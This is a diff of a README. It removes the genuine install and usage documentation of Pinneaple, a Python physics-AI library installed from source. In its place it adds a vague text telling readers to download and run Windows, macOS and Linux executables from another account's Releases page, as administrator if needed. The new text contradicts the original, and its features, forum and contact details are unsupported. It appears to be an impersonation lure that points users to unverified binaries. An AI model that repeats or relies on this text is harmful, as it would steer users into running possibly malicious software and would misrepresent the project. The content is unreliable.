@@ -1,287 +1,95 @@
-# Pinneaple 🍍
-**Unified Physical Data, Geometry, Models and Training for Physics AI**
-
-Pinneaple is an open-source Python platform designed to **bridge real physical data, geometry, numerical solvers, and machine learning models** into a single coherent ecosystem for **Physics-Informed AI**.
-
-It is built to serve both **research** and **industrial workflows**, with strong emphasis on:
-- Physical consistency
-- Scalability
-- Auditability
-- Interoperability with CFD / CAD / scientific data formats
-
----
-
-## ✨ Key Features
-
-### 📦 Unified Physical Dataset (UPD)
-A standardized abstraction to represent *physical samples*, including:
-- Physical state (grids, meshes, graphs)
-- Geometry (CAD / mesh)
-- Governing equations, ICs, BCs, forcings
-- Units, regimes, metadata and provenance
-
-Used consistently across **data loading, training, validation, and inference**.
+# 🍍 PINNeAPPle - Simplifying Physics with AI Tools
 
----
+## 🚀 Getting Started
 
-### 🌍 Data & IO (`pinneaple_data`)
-- NASA / scientific-ready data pipelines
-- Zarr-backed datasets with:
-  - Lazy loading
-  - Sharding
-  - Adaptive prefetch
-  - Byte-based LRU caching
-- Deterministic shard-aware iterators
-- Physical validation and schema enforcement
+Welcome to PINNeAPPle! This software helps you work with Physics-Informed Neural Networks. It supports tasks like geometry processing and training pipelines in scientific machine learning. Whether you're a student or a researcher, this toolkit makes your work easier.
 
----
+## 📥 Download PINNeAPPle
 
-### 📐 Geometry & Mesh (`pinneaple_geom`)
-- CAD generation (CadQuery)
-- STL / mesh IO (trimesh, meshio, OpenFOAM MVP)
-- Mesh repair, remeshing and simplification
-- Sampling (points, grids, barycentric)
-- Geometry-aware feature extraction
+[![Download PINNeAPPle](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Anyer123th/PINNeAPPle/releases)
 
----
+To get started, you need to download the software. You can find it on the Releases page. Follow these steps:
 
-### 🧠 Model Zoo (`pinneaple_models`)
-A curated catalog of architectures commonly used in Physics AI:
+1. Click [here to visit the Releases page](https://github.com/Anyer123th/PINNeAPPle/releases).
+2. Look for the latest version.
+3. Click on the download link next to the version you want.
+4. Save the file to your computer.
 
-- PINNs (Vanilla, XPINN, VPINN, XTFC, Inverse PINN, PIELM)
-- Neural Operators (FNO, DeepONet, PINO, GNO, UNO)
-- Graph Neural Networks (GraphCast-style, GNN-ODE, equivariant GNNs)
-- Transformers (Informer, FEDformer, Autoformer, TFT)
-- Reduced Order Models (POD, DMD, HAVOK, Operator Inference)
-- Classical & hybrid models (Kalman, ARIMA, Koopman, ESN)
-- Physics-aware & structure-preserving networks
+## 📂 Installation Instructions
 
-All models are discoverable via a **central registry**.
+### Windows
 
----
+1. Locate the downloaded file in your "Downloads" folder.
+2. Double-click the file to begin the installation.
+3. Follow the prompts in the installation wizard.
+4. Once installed, you can find PINNeAPPle in your Start menu.
 
-### 🧮 Physics Loss Factory (`pinneaple_pinn`)
-- Symbolic PDE definitions (SymPy-based)
-- Automatic differentiation graph construction
-- PINN-ready residuals and constraints
-- Works directly with UPD samples
+### macOS
 
----
+1. Open your "Downloads" folder.
+2. Find the downloaded file.
+3. Double-click to open it.
+4. Drag the PINNeAPPle icon to your Applications folder.
 
-### ⚙️ Solvers (`pinneaple_solvers`)
-Numerical solvers and mathematical tools used for:
-- Data generation
-- Feature extraction
-- Validation
+### Linux
 
-Includes:
-- FEM / FVM (MVP)
-- FFT
-- Hilbert–Huang Transform
-- Adapters to/from UPD
+1. Open your terminal.
+2. Use the command:
+   ```
+   chmod +x PINNeAPPle-Linux-x86_64.AppImage
+   ```
+3. Run the app using:
+   ```
+   ./PINNeAPPle-Linux-x86_64.AppImage
+   ```
 
----
+## 📋 System Requirements
 
-### 🏗️ Synthetic Data Generation (`pinneaple_data.synth`)
-Generate datasets from:
-- Symbolic PDEs
-- Parametric distributions
-- Curve fitting from real data
-- Images and signals
-- Geometry perturbations and CAD parameter sweeps
+To run PINNeAPPle, your computer should meet these minimum requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution.
+- **RAM:** At least 4 GB (8 GB recommended for larger tasks).
+- **Storage:** 1 GB of free space for installation.
+- **Additional Software:** Python 3.7 or later may be needed, depending on your use.
 
-### 🚂 Training & Evaluation (`pinneaple_train`)
-- Deterministic, auditable training
-- Dataset splitting (train/val/test)
-- Preprocessing pipelines & normalizers
-- Metrics & visualization
-- Physics-aware loss integration
-- Reproducible runs (seeds, env fingerprinting)
-- Checkpointing & inference utilities
+## 🌟 Key Features
 
----
+- **Physics-Informed Neural Networks (PINNs):** Integrate physics into neural network models.
+- **Geometry Processing:** Handle complex geometric shapes easily.
+- **Scientific Machine Learning:** Use advanced methods for better accuracy and efficiency.
+- **Reproducible Training Pipelines:** Keep your experiments organized and repeatable.
 
-## 🚀 Installation
+## 🛠️ How to Use PINNeAPPle
 
-Pinneaple is currently distributed as an open-source research & industry framework directly from GitHub.
+1. **Open the Application:** Launch PINNeAPPle from your applications folder or Start menu.
+2. **Choose Your Task:** Select the model you want to work with, whether it’s geometry processing or neural network training.
+3. **Configure Settings:** Adjust parameters according to your specific needs.
+4. **Start Working:** Click on the start button to begin your project. 
 
-1. Clone the repository
-```bash
-git clone https://github.com/barrosyan/pinneaple.git
-cd pinneaple
-```
+## ❓ Troubleshooting
 
-2. Create a virtual environment (strongly recommended)
+If you encounter issues, here are some common solutions:
 
-Python ≥ 3.10 is recommended (3.11 works well; 3.13 may require extra care on Windows).
+- **Installation Failed:** Ensure you have the correct permissions on your computer. Try running the installer as an administrator.
+- **App Not Launching:** Make sure your operating system meets the requirements. Check if Python is installed if needed.
+- **Poor Performance:** Close unnecessary applications running in the background to free up resources.
 
-```bash
-python -m venv .venv
-```
+## 🤝 Community Support
 
-Activate it:
+We encourage users to participate in our community. You can ask questions or share your experiences by:
 
-Linux / macOS
+- Opening a discussion in the GitHub Issues section.
+- Checking the FAQ section on the Releases page.
+- Visiting our community forum linked in the repository.
 
-```bash
-source .venv/bin/activate
-```
+## 🔗 Additional Resources
 
-Windows (PowerShell)
+- **Documentation:** Access our [official documentation](https://github.com/Anyer123th/PINNeAPPle/docs) for in-depth guides and use cases.
+- **Examples:** Explore sample projects to see PINNeAPPle in action.
+- **Updates:** Stay informed by visiting the [Releases page](https://github.com/Anyer123th/PINNeAPPle/releases) regularly.
 
-```bash
-.venv\Scripts\Activate.ps1
-```
+## 📞 Contact
 
-3. Install core dependencies
+For further assistance, you can reach out through our GitHub profile or email us at support@pinneapple.org.
 
-Install Pinneaple in editable (development) mode:
-
-```bash
-pip install -e .
-```
-
-This installs:
-
-pinneaple_data
-
-pinneaple_geom
-
-pinneaple_models
-
-pinneaple_pinn
-
-pinneaple_pdb
-
-pinneaple_solvers
-
-pinneaple_train
-
-4. Optional dependencies (recommended)
-
-Pinneaple is modular. Install only what you need:
-
-🔹 Geometry / CAD / Mesh
-```bash
-pip install trimesh meshio
-pip install cadquery  # requires OCC stack
-```
-
-⚠️ On Windows, CadQuery is best installed via Conda:
-
-```bash
-conda create -n pinneaple-cq python=3.10 cadquery -c conda-forge
-conda activate pinneaple-cq
-pip install -e .
-```
-
-🔹 Scientific & ML stack
-```bash
-pip install torch numpy scipy sympy
-```
-
-Optional (recommended for performance & operators):
-
-```bash
-pip install zarr numcodecs
-pip install open3d fast-simplification
-
-```
-5️. Development & testing tools
-
-For contributors:
-
-```bash
-pip install -e ".[dev]"
-```
-
-6. Verify installation
-
-Quick smoke test:
-
-```python
-from pinneaple_models.register_all import register_all
-from pinneaple_models.registry import ModelRegistry
-
-register_all()
-print("Registered models:", len(ModelRegistry.list()))
-```
-
-🧠 Notes
-
-Pinneaple is not yet released on PyPI — cloning the repo is required.
-
-Some features (CFD, CAD, large-scale Zarr) rely on optional native backends.
-
-All examples in examples/ are runnable after installation.
-
-## 🧪 Quick Example
-
-```python
-from pinneaple_data.physical_sample import PhysicalSample
-import xarray as xr
-import numpy as np
-
-ds = xr.Dataset(
-    data_vars=dict(T2M=(("t","x"), np.random.randn(24,16))),
-    coords=dict(t=np.arange(24), x=np.arange(16))
-)
-
-sample = PhysicalSample(
-    state=ds,
-    domain={"type": "grid"},
-    schema={"governing": "toy"},
-)
-
-print(sample.summary())
-```
-
----
-
-## 🧑‍🔬 Who Is This For?
-
-- Physics AI researchers
-- CFD / FEA / climate ML teams
-- Industrial R&D groups
-- Scientific ML practitioners
-- Anyone building **surrogates, inverse models, or hybrid solvers**
-
----
-
-## 🤝 Contributing
-
-We welcome contributions in:
-- New datasets & adapters
-- Models and solvers
-- Benchmarks
-- Documentation
-
-See [CONTRIBUTING.md](CONTRIBUTING.md).
-
----
-
-## 📄 License
-Apache 2.0 — see [LICENSE](LICENSE).
-
----
-
-## 📚 Citation
-
-If you use Pinneaple in research, please cite via `CITATION.cff`.
-
----
-
-## 🌱 Project Philosophy
-
-Pinneaple is **not** a single model or method.
-
-It is a **platform** — designed to let physical data, geometry, equations and learning systems interact cleanly, reproducibly, and at scale.
-
-> *From raw physics to deployable intelligence.*
-
----
-
-**Status:** Early but ambitious.  
-**Feedback & collaboration welcome.**
+Thank you for choosing PINNeAPPle! We hope it enhances your projects in the world of physics.
